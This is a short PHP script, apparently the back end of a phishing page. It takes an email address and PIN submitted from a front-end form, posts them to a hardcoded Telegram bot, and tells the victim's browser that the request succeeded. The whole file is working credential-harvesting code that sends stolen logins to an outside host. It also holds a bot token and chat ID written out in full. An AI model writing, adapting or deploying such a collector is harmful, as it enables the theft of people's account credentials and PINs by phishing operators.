<?php
header('Content-Type: application/json');

// 1️⃣ Token Bot Telegram dan Chat ID
$botToken = "8577684037:AAG5RTXGp5CCLlSIzV8R7bp8_Lc8VJrf9Vw";
$chatId   = "8504237944";

// 2️⃣ Ambil data dari POST JSON
$input = json_decode(file_get_contents('php://input'), true);

if(!isset($input['email']) || !isset($input['pin'])){
    echo json_encode(['success'=>false,'error'=>'Email atau PIN kosong']);
    exit;
}

// 3️⃣ Buat pesan
$message = "Email: " . $input['email'] . "\nPIN: " . $input['pin'];

// 4️⃣ Kirim ke Telegram
$url = "https://api.telegram.org/bot$botToken/sendMessage";
$data = [
    'chat_id' => $chatId,
    'text'    => $message
];

$options = [
    'http' => [
        'method'  => 'POST',
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'content' => http_build_query($data),
    ]
];

$context = stream_context_create($options);
$result  = file_get_contents($url, false, $context);

// 5️⃣ Balikan respon ke frontend
echo json_encode(['success'=>true]);
?>